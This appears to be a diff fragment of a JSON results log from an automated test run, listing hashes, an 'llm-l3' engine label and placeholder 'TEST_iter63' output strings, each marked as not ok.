+      "sha1": "a783237740d9543c747b3d6cb11cd40dbba81510",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "TEST_iter63_1786020098 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "3ea67469101bc5084123b64fe9079f513e191419",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "TEST_iter63_1786108287 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "92e70901f74cadb5202836fe84bca62218ee43b1",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "TEST_iter63_1786133908 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "44a1d2c51e93a710d9efff0b6386f63be087515e",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "TEST_iter63_1786135830 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "6d3583a64f65e5644014fdaf2dcf718bc016d788",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "TEST_iter63_1786170122 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "471495f906adcbba2efad091f784495db3aaa984",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "TEST_iter63_1786170808 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "4cf84dba3e2dd14163f7b088c349b98ca19a055a",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "TEST_iter63_1786193971 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "a61040c01ceac67a440a371f1bac3cfa1018462d",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "TEST_iter63_1786247229 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "d616a3955ddfb8b0a4a8c83807a7970fc68c3deb",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "TEST_iter63_1786264337 nivxray unique payload",
+      "ok": false
+    },
+    {
+      "sha1": "08682e2b70354a7096180dadbe85a3f4daf4175f",
+      "engine": "llm-l3",
+      "chain": [],
+      "output_head": "TEST_iter63_1788290124 nivxray unique payload",
+      "ok": false
+    }
+  ]
+}
